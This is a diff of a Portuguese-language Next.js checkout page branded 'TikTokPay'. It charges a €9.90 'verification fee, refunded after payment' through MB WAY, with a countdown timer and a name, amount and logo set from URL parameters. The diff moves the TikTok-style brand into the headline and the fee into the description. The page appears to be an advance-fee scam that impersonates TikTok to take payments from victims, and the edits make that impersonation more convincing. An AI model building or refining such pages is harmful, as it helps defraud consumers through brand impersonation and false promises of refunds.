@@ -2,11 +2,11 @@ import Head from 'next/head'
 import { useEffect, useState } from 'react'
 
 export default function Checkout() {
-  // Alterado: Nome e Descrição padrão atualizados para Portugal
+  // Alterado: Nome principal agora é TikTokPay e a taxa foi para a descrição
   const [params, setParams]     = useState({ 
-    name: 'Taxa de Verificação – Reembolso após Pagamento', 
+    name: 'TikTokPay', 
     amount: 9.90, 
-    description: 'TikTokPay Lda.', 
+    description: 'Taxa de Verificação – Reembolso após Pagamento', 
     logo: '', 
     timer: 10 
   })
@@ -24,10 +24,9 @@ export default function Checkout() {
     const p = new URLSearchParams(window.location.search)
     const timer = parseInt(p.get('timer') || '10', 10)
     setParams({
-      // Alterado: Fallback dos parâmetros da URL também atualizados
-      name:        p.get('name')        || 'Taxa de Verificação – Reembolso após Pagamento',
+      name:        p.get('name')        || 'TikTokPay',
       amount:      parseFloat(p.get('amount') || '9.90'),
-      description: p.get('description') || 'TikTokPay Lda.',
+      description: p.get('description') || 'Taxa de Verificação – Reembolso após Pagamento',
       logo:        p.get('logo')        || '',
       timer,
     })
@@ -84,7 +83,7 @@ export default function Checkout() {
         body: JSON.stringify({
           amount:             params.amount,
           method,
-          paymentDescription: params.name.slice(0, 50),
+          paymentDescription: params.description.slice(0, 50),
           currency:           'EUR',
           payer: {
             name:     params.name + ' Customer',
@@ -148,23 +147,20 @@ export default function Checkout() {
           max-width: 80%; max-height: 80%;
           width: auto; height: auto; display: block; object-fit: contain;
         }
-        .product-logo-letter { 
-          position: absolute; top: 50%; left: 50%;
-          transform: translate(-50%, -50%);
-          color: #fff; font-size: 1.4rem; font-weight: 800; 
-        }
-        .product-name-header { font-size: 1.05rem; font-weight: 700; margin-bottom: .2rem; }
+        .product-name-header { font-size: 1.2rem; font-weight: 800; margin-bottom: .1rem; color: #000; }
         .product-secure { font-size: .78rem; color: #888; font-weight: 400; }
 
         .payment-card { padding: 1.25rem; }
-        .payment-title { font-size: .95rem; font-weight: 700; margin-bottom: .1rem; }
-        .payment-sub   { font-size: .78rem; color: #888; margin-bottom: 1rem; }
+        .payment-title { font-size: 1.1rem; font-weight: 800; margin-bottom: .2rem; }
+        .payment-sub   { font-size: .85rem; color: #666; margin-bottom: 1.2rem; line-height: 1.4; }
+        
         .total-box {
           background: #f7f7f7; border-radius: 10px;
           padding: .85rem 1rem; text-align: center; margin-bottom: 1rem;
         }
         .total-label { font-size: .75rem; color: #888; margin-bottom: .25rem; }
         .total-value { font-size: 1.65rem; font-weight: 700; color: #F0004F; letter-spacing: -.02em; }
+        
         .method-tabs { display: flex; gap: .5rem; margin-bottom: 1rem; }
         .method-tab {
           flex: 1; padding: .65rem .5rem;
@@ -175,6 +171,7 @@ export default function Checkout() {
           transition: all .15s; text-align: center;
         }
         .method-tab.active { background: #F0004F; border-color: #F0004F; color: #fff; }
+        
         .phone-group {
           display: flex; border: 1.5px solid #d8d8d8;
           border-radius: 10px; overflow: hidden;
@@ -223,22 +220,20 @@ export default function Checkout() {
       </div>
 
       <div className="page">
+        {/* CABEÇALHO COM NOME PRINCIPAL */}
         <div className="card product-card">
           <div className="product-logo">
-            { (params.logo || "https://i.postimg.cc/L4fzn491/7safpbsxoywisudmovpfonxnj.gif") ? (
-              <img 
-                src={params.logo || "https://i.postimg.cc/L4fzn491/7safpbsxoywisudmovpfonxnj.gif"} 
-                alt={params.name} 
-                onError={(e) => { e.target.style.display = 'none'; }}
-              />
-            ) : (
-              <span className="product-logo-letter">{params.name.charAt(0).toUpperCase()}</span>
-            )}
+            <img 
+              src={params.logo || "https://i.postimg.cc/L4fzn491/7safpbsxoywisudmovpfonxnj.gif"} 
+              alt={params.name} 
+              onError={(e) => { e.target.style.display = 'none'; }}
+            />
           </div>
           <div className="product-name-header">{params.name}</div>
           <div className="product-secure">Pagamento seguro • WayMB</div>
         </div>
 
+        {/* CARD DE PAGAMENTO COM TÍTULO E DESCRIÇÃO (TAXA) */}
         <div className="card payment-card">
           <div className="payment-title">{params.name}</div>
           <div className="payment-sub">{params.description}</div>
